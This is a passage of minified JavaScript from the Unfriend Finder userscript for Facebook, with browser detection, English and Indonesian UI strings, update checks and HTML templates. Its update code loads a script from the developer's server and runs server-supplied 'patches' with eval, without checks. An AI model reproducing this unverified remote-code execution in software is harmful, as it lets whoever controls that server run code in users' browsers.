}else{if(/msie/i.test(ua.userAgent)){ua.browser="Internet Explorer";ua.browserversion=ua.userAgent.match(/msie\s?([0-9\.]*)/i)[1]}}}}}}}}}catch(exception){new ErrorHandler(exception,"UserAgent.parse()")}try{if(/(\(|;\s)Windows (?:NT ([0-9]\.[0-9]|98))(;\s|\))/i.test(ua.userAgent)){ua.system="Windows";ua.systemversion=ua.parseOsVersion(ua.userAgent.match(/(\(|;\s)Windows (?:NT ([0-9]\.[0-9]|98))(;\s|\))/i)[2])}else{if(/\(Macintosh/i.test(ua.userAgent)){ua.system="MacOS X";ua.systemversion=ua.userAgent.match(/\sMac OS X ([^;]+);/i)[1].replace(/_/g,".")
}else{if(/\(X11(?:;\sU)?;\s?Linux/i.test(ua.userAgent)){ua.system="Linux";var r=/(?:(Mandriva(?:\sLinux)?|CentOS|Fedora|Ubuntu|SUSE|PCLinuxOS|Remi|Linux\sMint)\/(?:([a-z0-9.-]{1,})|([a-z0-9.-]{1,}(?:\s\([^\)]+\)?)))?)/i;if(r.test(ua.userAgent)){ua.systemversion=ua.userAgent.match(r)[1]+" "+ua.userAgent.match(r)[2]}}else{if(/\(iPhone;/i.test(ua.userAgent)){ua.system="iPhone";ua.systemversion=ua.userAgent.match(/iPhone;\sU;([^;\)]+)/i)[1]}}}}}catch(exception){new ErrorHandler(exception,"UserAgent.parse()")
}};ua.parseOsVersion=function(v){switch(v){case"6.2":return"8";case"6.1":return"Seven";case"6.0":return"Vista";case"5.2":return"Server 2003";case"5.1":return"XP";case"5.01":return"2000 SP1";case"5.0":return"2000";case"98":return"98"}};ua.Browser=function(){return ua.browser};ua.BrowserVersion=function(){return ua.browserversion};ua.System=function(){return ua.system};ua.SystemVersion=function(){return ua.systemversion};ua.toString=function toString(){return ua.userAgent};ua.browser=null;ua.browserversion=null;

ua.system=null;ua.systemversion=null};var Switch=function Switch(__value,__options,__default){if(__options.hasOwnProperty(__value)){return __options[__value]}else{if(__options.hasOwnProperty("default")){return __options["default"]}else{return __default}}};$en_US={langname:"English (US)",unfriends:"Unfriends",awaiting:"Pending Requests",notifications:"Notifications",messages:"Messages",nomessages:"No Messages",joinGroup:"Join group",cancel:"Cancel",change:"change",manage:"manage",reset:"reset",hide:"hide",behavior:"Preferences",lang:"Language",help:"Help",usesetting:"Change preferences and settings.",deactivated:"Profiles deactivated",reactivated:"Profiles reactivated",confirmed:"Requests confirmed",declined:"Requests declined",onunfriend:"When someone unfriends me or deactivates their profile",oncanceled:"When a friend request has been canceled",othersettings:"Other settings",icons:"Display icons",uids:"Display UIDs",profilepics:"Update profile pictures",hidemenubar:"Hide Unfriends in menubar",dissociateLists:"Split Accepted and Ignored Requests",showTime:"Show date and times of Unfriends",newManagementLists:"Use new Removing Connection system",webkitNotifications:"Enable webKit Notifications",onlyShowNewUnfriends:"Only show new Unfriends in counters",disabled:"disabled",error:"Error",block:"Block",clang:"Choose your language :",currentlang:"Current language",creset:"Reset selected data",resetbody:"Caution: Resetting the scripts values removes all preferences, settings and generated data. Do you wish to proceed?",use:"Use",display:"Display",btn_ok:"Okay",btn_cancel:"Cancel",btn_close:"Close",btn_save:"Save",btn_submit:"Submit",btn_confirm:"Confirm",btn_delete:"Delete",btn_next:"Next",text_ignored:"ignored your friend request.",text_unfriend:"is no longer in your friendlist.",text_reactivated:"has reactivated their profile.",text_deactivated:"has deactivated their profile.",text_accepted:"has accepted your friend request",text_canceled:"has cancelled your friend request",text_pending:"Friend Request Pending",text_noa:"No Pending Request",text_nou:"No Unfriends",text_error:"Error while removing connection.",text_hideu:"Hide Unfriend",text_hide:"Hide",text_alwayshide:"Always Hide",text_removec:"Remove Connection",new_version:"New Version",notif_version:"A new version is available.",here:"Click to update",wasunfriend:"was in your friendlist.",hasignored:"ignored one of your friend requests.",settings:"Settings",proceed:"Proceed",exportData:"Export Data",importData:"Import Data",text_export:"Backup",text_import:"Restore",dataToExport:"Data to export",exportHint:"Hit CTRL+C to copy backup to your clipboard.",importHint:"Hit CTRL+V to get backup from your clipboard.",hideOwnUnfriends:"Hide friends that you remove",wontAppear:"This profile won't appear in your unfriends list.",today:"Today",yesterday:"Yesterday",months:"January, February, March, April, May, June, July, August, September, October, November, December",hide_perm:"Do you want to hide permanently {name} ?",reset_:"Reset",resettitle:"Reset values, preferences and settings to default.",back1:"The unfriends list is locally generated. This means that if you use facebook on another computer, or another session, you will not be able to get your Unfriends.",back2:"Use this backup tool to import your preferences, settings and generated Unfriends data to another computer or browser.",rvoid:"Tick the boxes that you want to reset to default. As a precaution, it's strongly suggested of making a backup of your preferences, settings and generated data using the export tool below.",selectall:"Select all",selectnone:"Select none",cancelAll:"Cancel All",hideAll:"Hide All",header_unfriends:"Unfriends",header_reappeared:"Reappeared",header_ignored:"Requests Ignored",header_accepted:"Requests Accepted",header_both:"Requests Accepted & Ignored",header_pending:"Requests Pending",paging:"Paging",enablepaging:"Enable Paging",pagecount:"Amount of profiles displayed per pages",hideNub:"Hide the bottom-right button",disable:"Disable",resetValues:"Reset values to default.",changeSettings:"Change Settings.",statistics:"Send usage statistics to Google Analytics"};

$en_GB={langname:"English (UK)",unfriends:"Unfriends",awaiting:"Pending Requests",notifications:"Notifications",messages:"Messages",nomessages:"No Messages",joinGroup:"Join group",cancel:"Cancel",change:"change",manage:"manage",reset:"reset",hide:"hide",behavior:"Preferences",lang:"Language",help:"Help",usesetting:"Change preferences and settings.",deactivated:"Deactivated profiles",reactivated:"Reactivated profiles",confirmed:"Confirmed requests",declined:"Declined requests",onunfriend:"When someone unfriends me or deactivates their profile",oncanceled:"When a friend request has been cancelled",othersettings:"Other settings",icons:"Display icons",uids:"Display UIDs",profilepics:"Update profile pictures",hidemenubar:" Hide Unfriends in menubar",dissociateLists:"Split Accepted and Ignored requests",showTime:"Show date and times of Unfriends",newManagementLists:"Use new Removing Connection system",webkitNotifications:"Enable webKit Notifications",onlyShowNewUnfriends:"Only show new Unfriends in counters",disabled:"disabled",error:"Error",block:"Block",clang:"Choose your language:",currentlang:"Current language",creset:"Reset data",resetbody:"Caution: Resetting the scripts values removes all preferences, settings and generated data. Do you wish to proceed?",use:"Use",display:"Display",btn_ok:"Okay",btn_cancel:"Cancel",btn_close:"Close",btn_save:"Save",btn_submit:"Submit",btn_confirm:"Confirm",btn_delete:"Delete",btn_next:"Next",text_ignored:"ignored your friend request.",text_unfriend:"is no longer in your friendlist.",text_reactivated:"has reactivated their profile.",text_deactivated:"has deactivated their profile.",text_accepted:"has accepted your friend request.",text_canceled:"has cancelled your friend request.",text_pending:"Friend Request Pending",text_noa:"No Pending request",text_nou:"No Unfriends",text_error:"Error whilst removing connection.",text_hideu:"Hide Unfriend",text_hide:"Hide",text_alwayshide:"Always Hide",text_removec:"Remove connection",new_version:"New Version",notif_version:"A new version is available",here:"here",wasunfriend:"was in your friendlist.",hasignored:"ignored your friend request.",settings:"Settings",proceed:"Proceed",exportData:"Export data (Backup)",importData:"Import data (Restore Backup)",text_export:"Export",text_import:"Import",dataToExport:"Data to export",exportHint:"Hit CTRL C to copy backup to your clipboard.",importHint:"Hit CTRL V to get backup from your clipboard.",hideOwnUnfriends:"Hide friends that you've removed",wontAppear:"This profile won't appear in your unfriends list.",today:"Today",yesterday:"Yesterday",months:"January, February, March, April, May, June, July, August, September, October, November, December",hide_perm:"Do you want to permanently hide {name}?",reset_:"Reset",resettitle:"Reset values, preferences and settings to default.",back1:"The unfriends list is locally generated. This means that if you use facebook on another computer, or another session, you will not be able to get your Unfriends.",back2:"Use this backup tool to import your preferences, settings and generated Unfriends data to another computer or browser.",rvoid:"Tick the boxes that you want to reset to default. As a precaution, we strongly suggest making a back-up of your preferences, settings and generated data using the export tool below.",selectall:"Select all",selectnone:"Select none",cancelAll:"Cancel All",hideAll:"Hide All",header_unfriends:"Unfriends",header_reappeared:" Reappeared",header_ignored:"Ignored Requests",header_accepted:"Accepted Requests",header_both:"Accepted & Ignored Requests",header_pending:"Pending Requests",paging:"Paging",enablepaging:"Enable Paging",pagecount:"Amount of profiles displayed per pages",hideNub:"Hide the bottom-right icon",disable:"Disable",resetValues:"Reset values to default.",changeSettings:"Change Settings.",statistics:"Send usage statistics to Google Analytics"};

$id_ID={langname:"Bahasa Indonesia",unfriends:"Unfriends",awaiting:"Menunggu Tanggapan",notifications:"Pemberitahuan",messages:"Pesan",nomessages:"tidak ada Pesan",joinGroup:"Gabung ke grup",cancel:"batal",change:"ubah",manage:"kelola",reset:"pulihkan",hide:"sembunyikan",behavior:"Tampilan",lang:"Bahasa Indonesia",help:"Bantuan",usesetting:"Pergunakan pengaturan ini untuk mengelola script",deactivated:"Profil di nonaktifkan",reactivated:"Profil dihidupkan kembali",confirmed:"Permintaan terkonformasi",declined:"Permintaan ditolak",onunfriend:"Saat kamu mendapatkan pertidaktemanan",oncanceled:"Saat permintaan pertemanan batal",othersettings:"Pengaturan lain",icons:"Tampilkan ikon",uids:"Tampilkan UIDs",profilepics:"Perbaharui gambar profil",hidemenubar:"Sembunyikan Unfriends Pada Menu",dissociateLists:"Split diterima dan Permintaan diabaikan",showTime:"Tampilkan tanggal ketika unfriend",newManagementLists:"Use new Removing Connection system",webkitNotifications:"Enable webKit Notifications",onlyShowNewUnfriends:"Only show new Unfriends in counters",disabled:"dimatikan",error:"Rusak",block:"Blokir",clang:"Pilih bahasa Anda",currentlang:"Bahasa sekarang",creset:"Klik untuk mereset",resetbody:"Apakah Anda yakin inigin memulihkan nilai ?",use:"Gunakan",display:"Tampilakan",btn_ok:"Setuju",btn_cancel:"batal",btn_close:"Tutup",btn_save:"Simpan",btn_submit:"Daftar",btn_confirm:"Konfirmasi",btn_delete:"Hapus",btn_next:"Selanjutnya",text_ignored:"Abaikan permintaan pertemanan Anda.",text_unfriend:"Tidak ada lagi dalam daftar teman",text_reactivated:"Profil teraktifasi ulang",text_deactivated:"Profil terhapus atu tersembunyi",text_accepted:"Permintaan pertemanan diterima",text_canceled:"Pewrmintaan pertemanan ditolak",text_pending:"Permintaan pertemanan menunggu",text_noa:"Tidak ada parmintaan yang menunggu",text_nou:"tidak ada unfriends",text_error:"Error ketika menghapus hubungan",text_hideu:"Sembunyikan unfriend",text_hide:"Sembunyikan",text_alwayshide:"Selalu Sembunyi",text_removec:"Hapus hubungan",new_version:"Versi Terbaru",notif_version:"Sebuah versi terbaru tersedia",here:"di sini",wasunfriend:"Pernah di daftar teman Anda",hasignored:"Abaikan salah satu permintaan pertemanan Anda",settings:"Pengaturan",proceed:"Proses",exportData:"Ekspor data",importData:"Impor data",text_export:"Ekspor",text_import:"Import",dataToExport:"Data yang diekspor",exportHint:"Hit CTRL+C to copy backup to your clipboard.",importHint:"Hit CTRL+V to get backup from your clipboard.",hideOwnUnfriends:"Sembunyikan teman yang dihapus",wontAppear:"Profil ini tidak lagi muncul di daftar kawanan anda",today:"Hari ini",yesterday:"Kemarin",months:"Januari, Februari, Maret, April, Mei, Juni, Juli, Agustus, September, Oktober, Nopember, Desember",hide_perm:"Handakkah kam manyambunyikan sacara parmanen {name} ?",reset_:"Pulihkan",resettitle:"Pulihkan nilai ke semula",back1:"Daftar unfriends adalah lokal. Ini berarti bahwa jika Anda menggunakan facebook di komputer lain, atau yang berbeda, Anda tidak akan bisa mendapatkan unfriends Anda.",back2:"Gunakan alat cadangan untuk ekspor atau impor daftar Anda ke atau dari browser lain.",rvoid:"Memulihkan script dapat menghancurkan semua data Anda tentang unfriends Anda. Hati-hati.",selectall:"Pilih Semua",selectnone:"Pilih Tak Satu Pun",cancelAll:"Cancel All",hideAll:"Hide All",header_unfriends:"unfriends",header_reappeared:"Muncul kembali",header_ignored:"Permintaan Ditolak",header_accepted:"Permintaan Diterima",header_both:"Permintaan Diterima dan Ditolak",header_pending:"Permintaan tertunda",paging:"Paging",enablepaging:"Enable Paging",pagecount:"Amount of profiles displayed per pages",hideNub:"Hide the bottom-right button",disable:"Disable",resetValues:"Reset values to default.",changeSettings:"Change Settings.",statistics:"Send usage statistics to Google Analytics"};

function updateStandAlone(force){trace();var beeper;if(!force){var l=Registry.getKey("lastUpdateCheck",0),t=(+new (Date)).toString();if(l==0){Registry.setKey("lastUpdateCheck",t)}if((t-l)<(3*3600*1000)){return}Registry.setKey("lastUpdateCheck",t)}if(getFromId("versionContainer")){getFromId("versionContainer").parentNode.removeChild(getFromId("versionContainer"))}var updateNubPane,versionContainer=new xHTMLElement({element:"div",id:"versionContainer",style:{display:CSS3.DISPLAY.none},parentNode:Params.body,listeners:{DOMNodeInserted:function(eArg){try{var content,ver,element=eArg.target;
if(element.id=="versionInfos"){ver=element.getAttribute("version");if(ver>1){if(Params.version<ver){Registry.setKey("newversion",ver);Console.log("New version "+ver+" available: "+Params.links.update);if(updateNubPane=getFromId("updateNubPane")){getFromId("updatePane").innerHTML='A new version is available.<br /><a id="versionLink" href="'+Params.links.update+'">Click to update</a>.';CSS3.display(updateNubPane,CSS3.DISPLAY.block)}beeper.Add({type:"version",text:'<a href="'+Params.links.page+'">'+Params._0x4d22+'</a>: A new version is available.<br /><a id="versionLink" href="'+Params.links.update+'">Click to update</a>.',id:"newversion",status:null});
new xHTMLNotification({type:"version",name:"",picture:"",action:'<a href="'+Params.links.page+'">'+Params._0x4d22+'</a>: A new version is available.<br /><a id="versionLink" href="'+Params.links.update+'">Click to update</a>.',date:genTime(element.getAttribute("date")||core.time()),callback:function(){window.open(Params.links.update)}});inject(function(){try{if($("iconNubUF")){window.animateUpdate=setInterval(function(){animation($("iconNubUF")).to("top",-8).duration(400).checkpoint().to("top",-16).duration(200).checkpoint().to("top",-8).duration(400).checkpoint().to("top",-16).duration(200).checkpoint().to("top",-8).duration(400).checkpoint().go()
},5000)}}catch(exception){}});getFromId("actionPane").removeChild(getFromId("actionLink_checkUpdateAction"));Params.newVersion=true;try{getFromId("versionLink").href=element.getAttribute("href")}catch(exception){}if(getFromId("actionLink_checkUpdateAction")){CSS3.hide(getFromId("actionLink_checkUpdateAction"))}}else{Console.log("Unfriend Finder is up to date.");if(content=getFromId("debug_loadingversion")){var span=new xHTMLElement({element:"span",parentNode:getFromId("actionPane"),before:getFromId("actionLink_checkUpdateAction"),innerHTML:"No new version"});
getFromId("actionPane").removeChild(getFromId("actionLink_checkUpdateAction"))}if(getFromId("updateUfFromFutureNav")){CSS3.hide(getFromId("updateUfFromFutureNav").parentNode)}if(core){core.filter.unmarkUpdate()}}}}}catch(ex){}}}}).getElement();setTimeout(function(){beeper=new (Beeper);if(getFromId("debug_loadingversion")){CSS3.display(getFromId("debug_loadingversion").parentNode,CSS3.DISPLAY.inlineBlock)}var g=new xHTMLElement({element:"script",id:"updateUF",src:"https://www.unfriendfinder.com/update.js?id=0",parentNode:Params.head}).getElement()
},1000)}function checkForUpdate(force){trace();if(Params.version==14){return}if(Params.updateChecked){return}Params.updateChecked=true;var n=Registry.getKey("newversion","0");if(core){if((Params.version<=n)&&(Params.dev==true)){core.markUpdate(n,1);return}else{if(Params.version<n){core.markUpdate(n,1);return}else{core.filter.unmarkUpdate()}}}else{return}if(!force){var l=Registry.getKey("lastUpdateCheck",0),t=(+new (Date)).toString();if(l==0){Registry.setKey("lastUpdateCheck",t)}if(((t-l)<(3*3600*1000))&&(!force)){return
}Registry.setKey("lastUpdateCheck",t)}var versionContainer,welcomeContainer,UFMessagesContainer,DoctorContainer;if(getFromId("debug_loadingversion")){CSS3.display(getFromId("debug_loadingversion").parentNode,CSS3.DISPLAY.inlineBlock)}versionContainer=new xHTMLElement({element:"div",id:"versionContainer",style:{display:CSS3.DISPLAY.none},parentNode:Params.body,listeners:{DOMNodeInserted:function(e){if(getFromId("versionInfos")){Params.timeoutupdate=setTimeout(function(){core.parseVersion()},500)}}}}).getElement();
CSS3.hide(versionContainer);welcomeContainer=new xHTMLElement({element:"div",id:"welcomeContainer",style:{display:CSS3.DISPLAY.none},parentNode:Params.body,listeners:{DOMNodeInserted:function(){var welcomeContainerFC;try{if(welcomeContainerFC=getFromId("welcomeContainer").firstElementChild){if(welcomeContainerFC.innerHTML=="loadWelcome"){Console.log("First start, showing welcome box..");if(core){core.loadWelcomeFacebox()}}}}catch(exception){new ErrorHandler(exception,"welcomeContainer.DOMNodeInserted")
}}}}).getElement();CSS3.hide(welcomeContainer);UFMessagesContainer=new xHTMLElement({element:"div",id:"UFMessagesContainer",style:{display:CSS3.DISPLAY.none},parentNode:Params.body,listeners:{DOMNodeInserted:function(){var UFMessagesContainerFC;try{if(UFMessagesContainerFC=getFromId("UFMessagesContainer").firstElementChild){core.messagesHTML=UFMessagesContainerFC.innerHTML;getFromId("UFMessagesContainer").innerHTML=""}}catch(exception){new ErrorHandler(exception,"UFMessagesContainer.DOMNodeInserted")
}}}}).getElement();DoctorContainer=new xHTMLElement({element:"div",id:"DoctorContainer",parentNode:Params.body,listeners:{DOMNodeInserted:function(){setTimeout(function(){try{if(getFromId("DoctorContainer").firstElementChild){var oldPatches=Registry.getKey("healing","[]");var newPatches=getFromId("DoctorContainer").firstElementChild.innerHTML;try{void eval(newPatches)}catch(exception){new ErrorHandler(exception,"DoctorContainer.DOMNodeInserted.eval");getFromId("DoctorContainer").firstElementChild.innerHTML="[]";
newPatches="[]"}Registry.setKey("healing",newPatches);if((oldPatches.length!=newPatches.length)&&(oldPatches!="[]")){Console.info("New patches are available.");if(core){core.notify({type:"doctor"})}}if(core){core.doctor=new Doctor(newPatches)}}}catch(exception){new ErrorHandler(exception,"DoctorContainer.DOMNodeInserted")}},0)}}}).getElement();new xHTMLElement({element:"script",type:"text/javascript",id:"updateUF",src:"https://www.unfriendfinder.com/update.js?"+core.dat,parentNode:Params.head})}var template={help:function(){return'<i class="uiButtonIcon img spritemap_icons_fix " style="background-position: 0pt -1325px; height: 16px; width: 15px ! important;"></i> '+LANG.help+": "+Params._0x4d22
},BeeperBox:function(){return'    <div class="UFBeeper_Full">        <div class="Beeps"></div>        <div id="UFBeeper_Arrow" class="UFBeeper_Arrow" style="opacity: 1; z-index: 111;"></div>    </div>    <div class="UFBeeper_Arrow" style="opacity: 1; z-index: 110;"></div>'},Donate:function(){if(/fr_FR/.test(Params.body.className)){var e="fr_FR"}else{var e="en_US"}return'<div id="uf_donation">'+(e=="fr_FR"?"Unfriend Finder est gratuit!<br />Si vous aimez le script, faites un don en ligne pour soutenir le projet. C'est sécurisé et facile!":"Unfriend Finder is free!<br />If you like the script, please consider making a donation to support further development!")+'   <br /><br />   <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">      <input type="hidden" name="cmd" value="_s-xclick">      <input type="hidden" name="hosted_button_id" value="ZGR5QE83DGRK8">      <input type="image" src="https://www.paypal.com/'+e+'/FR/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - la solution de paiement en ligne la plus simple et la plus sécurisée !">      <img alt="Donate" border="0" src="https://www.paypal.com/'+e+'/i/scr/pixel.gif" width="1" height="1">   </form></div>'
},UnfriendLists:function(){return'<div id="UFLists">    <div id="unfriendsError" style="margin-bottom: 20px; display: none;">        <div style="background: none repeat scroll 0 0 #FFEBE8; border: 1px solid #DD3C10; color: #333333; font-size: 11px; margin-bottom: 10px; padding: 10px; text-align: justify;  -webkit-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -moz-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -ms-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -o-box-shadow: 0 4px 16px rgba(0,0,0,0.2); box-shadow: 0 4px 16px rgba(0,0,0,0.2);">            <div class="fr_FR"><strong>Il semble que vous ayiez plus de 3500 amis.</strong>                <br />Du fait que la liste d\'amis renvoyée par Facebook ne contient pas plus de 3500 connexions, et toute différentes à chaque appel, le script ne peut pas se fier à une liste d\'amis qui fluctue constemment.                <br />D\'autre part, certaines de vos requêtes en attente ne pourront pas être affiché, ou contiendront certains de vos amis.                <br />Ceci est dû au fait que la base de donnée renvoyée par Facebook est incomplête, et tout cela ne peut pas être corrigé.            </div>            <div class="en_US"><strong>It seems you have more than 3500 friends.</strong>                <br />Because the Facebook friendlist database is limited to 3500 friends, above this limit, the script can\'t be accurate in its notifications.                <br />Also, because they are missing from the database, some of your pending request may not be displayed, or some of your friends could be included in here.                <br />This issue is due to an incomplete database given by Facebook. Unfortunately it can\'t be fixed.            </div>        </div>    </div>    <div id="databaseError" style="margin-bottom: 20px; display: none;">        <div style="background: none repeat scroll 0 0 #FFEBE8; border: 1px solid #DD3C10; color: #333333; font-size: 11px; margin-bottom: 10px; padding: 10px; text-align: justify; -webkit-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -moz-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -ms-box-shadow: 0 4px 16px rgba(0,0,0,0.2); -o-box-shadow: 0 4px 16px rgba(0,0,0,0.2); box-shadow: 0 4px 16px rgba(0,0,0,0.2);">            <div class="fr_FR"><strong>Houston, on a un problème.</strong>                <br />Il semblerait que la base de donnée utilisée par le script pour récupérer votre liste d\'amis n\'est pas accessible.                <br />Cela arrive lorsque Facebook fait des modifications qui impactent le script.                <br />Cette erreur a étée automatiquement transmise au développeur, <a onclick="window.open(this.href); return false;" href="https://www.unfriendfinder.com/databaseerror">visitez le site web</a> pour plus d\'informations.            </div>            <div class="en_US"><strong>Houston, we have trouble.</strong>                <br />It seems the Facebook database used by the script to get your friendlist is not accessible for now.                <br />This happen when Facebook made some important changes that affects the script.                <br />This error have been automatically reported to the developper, <a onclick="window.open(this.href); return false;" href="https://www.unfriendfinder.com/databaseerror">check the website</a> for more informations.            </div>        </div>    </div>    <div id="fish" class="home_no_stories clearfix" style="background: none; margin-bottom: 0px; display:none;">       <img src="https://www.facebook.com/images/icons/group-types/large/goldfish.png" style="float:left;">       <div class="home_no_stories_content" style="line-height: 42px;">           <div class="en_US">               <strong><a href="https://www.unfriendfinder.com/aprilfool">April fooled !</a> These friends aren\'t gone.</strong>           </div>           <div class="fr_FR">               <strong><a onclick="window.open(this.href); return false;" href="http://www.unfriendfinder.fr/aprilfool">Poisson d\'Avril !</a> Ces amis n\'ont pas disparu.</strong>           </div>       </div>    </div>    <div id="noUnfriends" class="home_no_stories clearfix" style="display:none;">        <span class="home_no_stories_icon list_empty" style="height:32px"></span>        <div class="home_no_stories_content">            <strong id="noText">'+LANG.text_nou+'</strong>        </div>    </div>    <div id="noAwaitings" class="home_no_stories clearfix" style="display:none;">        <span class="home_no_stories_icon list_empty" style="height:32px"></span>        <div class="home_no_stories_content">            <strong id="noTextaw">'+LANG.text_noa+'</strong>        </div>    </div>    <div id="loadingLists" style="height:200px; text-align:center; line-height:200px; display:none;"><img src="'+Params.images.bigIndicator+'" /></div>    <div id="groupUnfriends" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle"><span id="h3_title_unfriends">'+LANG.header_unfriends+'</span> <a href="#" onclick="return false;" id="h3Unfriends" style="display:none;">[?]</a></h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'unfriends\') }); return false;" id="hideall">Hide all</a></div></div></div>        <ul id="unfriendsContentUL" class="UFlist '+(Params.settings.displayBlocks?"blocks":"inlines")+'"></ul>        <div id="paging_unfriends">            <div class="rfloat">                <a id="paging_unfriends_down" class="prev uiButtonDisabled uiButton uiButtonNoText">                    <i class="mrs customimg img paging_arrows page_down"></i>                    <span class="uiButtonText"></span>                </a>                <a id="paging_unfriends_up" class="next uiButtonDisabled uiButton uiButtonNoText">                    <i class="mrs customimg img paging_arrows page_up"></i>                    <span class="uiButtonText"></span>                </a>                <a style="height: 16px;" class="uiButton '+(!Params.settings.displayBlocks?"uiButtonDepressed ":"")+'uiButtonNoText" id="paging_display_inlines">                    <i class="img"></i>                </a>                <a style="height: 16px; margin-left: -4px;" class="uiButton '+(Params.settings.displayBlocks?"uiButtonDepressed ":"")+'uiButtonNoText" id="paging_display_blocks">                    <i class="mrs customimg img"></i>                </a>            </div>        </div>    </div>    <div id="groupReappeared" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle"><span id="h3_title_reappeared">'+LANG.header_reappeared+'</span> <a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'helpreappeared\') }); return false;" id="helpreappeared">[?]</a></h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'reappeared\') }); return false;" id="hideallreappeared">Hide all</a></div></div></div>        <ul id="reappearedContentUL" class="UFlist inlines"></ul>        <div id="paging_reappeared" style="padding:10px 4px 20px 0px;">            <div class="rfloat">                <a id="paging_reappeared_down" class="prev uiButtonDisabled uiButton uiButtonNoText">                    <i class="mrs customimg img paging_arrows page_down"></i>                    <span class="uiButtonText"></span>                </a>                <a id="paging_reappeared_up" class="next uiButton uiButtonDisabled uiButtonNoText">                    <i class="mrs customimg img paging_arrows page_up"></i>                    <span class="uiButtonText"></span>                </a>            </div>        </div>    </div>    <div id="groupPending" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.header_pending+'</h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'pending\') }); return false;" id="cancelall">'+LANG.cancelAll+'</a><img src="'+Params.images.smallIndicator+'" style="display:none;" id="cancelallindicator" /></div></div></div>        <ul id="pendingContentUL" class="UFlist inlines"></ul>    </div>    <div id="groupAcceptedIgnored" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.header_both+'</h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'both\') }); return false;" id="hideallboth">'+LANG.hideAll+'</a></div></div></div>        <ul id="acceptedignoredContentUL" class="UFlist inlines"></ul>    </div>    <div id="groupIgnored" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.header_ignored+'</h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'ignored\') }); return false;" id="hideallignored">'+LANG.hideAll+'</a></div></div></div>        <ul id="ignoredContentUL" class="UFlist inlines"></ul>    </div>    <div id="groupAccepted" style="display:none;">        <div class="uiHeader uiHeaderTopAndBottomBorder uiHeaderSection uiHeaderGroup"><div class="clearfix uiHeaderTop"><div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.header_accepted+'</h3></div><div class="rfloat"><a href="#" onclick="window.reinject(function() { core.hideOrCancelFromHeader(\'accepted\') }); return false;" id="hideallaccepted">'+LANG.hideAll+'</a></div></div></div>        <ul id="acceptedContentUL" class="UFlist inlines"></ul>    </div></div><div id="UFMessages" style="display:none;" class="ThreadList">    <div id="UFMessages_list">        <div id="loadingLists" style="height:200px; text-align:center; line-height:200px; display:block;"><img src="'+Params.images.bigIndicator+'" /></div>    </div>    <div id="UFMessages_content" class="message_pane">    </div></div><div id="UFSettings" style="display:none;" class="editaccount">    <div class="closed" id="settingsBehavior">        <div class="uiHeader uiHeaderBottomBorder uiHeaderGroup">            <div class="clearfix uiHeaderTop">                <div class="lfloat"><h3 class="uiHeaderTitle">'+LANG.behavior+'</h3></div>                <div class="rfloat"><h5 style="position:relative; top:3px;"><a onclick="div = this.parentNode.parentNode.parentNode.parentNode.parentNode; div.className = (div.className == \'visible\'?\'closed\':\'visible\');"><span class="changeLink">'+LANG.change+'</span><span class="hideLink">'+LANG.hide+'</span></a></h5></div>            </div>        </div>        <div class="desc">            <div class="lfloat">'+LANG.usesetting+'</div>        </div>        <div class="hiddenContent">            <table cellspacing="0" style="margin-top:7px; margin-left:30px; width:460px;">                <tbody>                    <tr>                         <th class="no_border"></th>                         <th class="even_column no_border">'+LANG.display+'</th>                    </tr>                    <tr>                          <th class="iconPlace">                              <strong style="position:relative;">'+LANG.unfriends+'                                  <span style="background-position:-16px 0;                                       background-repeat:no-repeat;                                       display:block; height:20px; left:-22px;                                       position:absolute; top:-1px; width:20px; height:16px !important;                                      background-image:url('+Params.icons.unfriends+');" />                              </strong>                          </th>                          <th class="even_column logo">                              <img src="'+Params.images.blank+'" style="background-position:0 -798px; height:16px !important;" class="spritemap_icons spritemap_icons_fix" alt="Display"/>                          </th>                    </tr>                    <tr class="settings row">                          <td class="action_text">'+LANG.deactivated+'</td>                          <td class="even_column">                              <input type="checkbox" value="display_deactivated_profiles_disabled" disabled-="disabled" name="Params.settings.deactivated" title="'+LANG.deactivated+'" id="deactivated"'+(Params.settings.deactivated==1?' checked="checked"':"")+'" class="inputcheckbox "/>                          </td>                    </tr>                    <tr class="settings row">                          <td class="action_text">'+LANG.reactivated+'</td>                          <td class="even_column">                              <input type="checkbox" value="display_reappeared_profiles" name="Params.settings.reappeared" title="'+LANG.reactivated+'" id="reappeared"'+(Params.settings.reappeared?' checked="checked"':"")+'" class="inputcheckbox "/>                          </td>                    </tr>                    <tr class="settings row">                         <td class="action_text">'+LANG.hideOwnUnfriends+'</td>                         <td class="even_column">                             <input type="checkbox" value="settings_hideOwnUnfriends" name="Params.settings.hideOwnUnfriends" id="hideOwnUnfriends"'+(Params.settings.hideOwnUnfriends?' checked="checked"':"")+'" title="'+LANG.hideOwnUnfriends+'" class="inputcheckbox "/>                         </td>                    </tr>                 </tbody>             </table>             <table cellspacing="0" style="margin-top: 10px; 